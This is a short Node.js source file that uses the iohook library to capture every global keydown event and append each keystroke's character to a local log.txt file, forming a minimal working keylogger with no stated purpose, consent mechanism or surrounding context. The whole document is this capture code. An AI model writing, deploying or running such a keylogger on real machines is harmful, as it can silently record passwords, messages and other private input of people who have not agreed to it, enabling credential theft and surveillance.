const ioHook = require('iohook');
const fs = require('fs')
  
  ioHook.on('keydown', evt => {
      fs.writeFile('log.txt', String.fromCharCode(evt.rawcode),  {'flag':'a'},  function(err) {
        if (err) {
            return console.error(err);
        }
    });
  })

  module.exports = ioHook;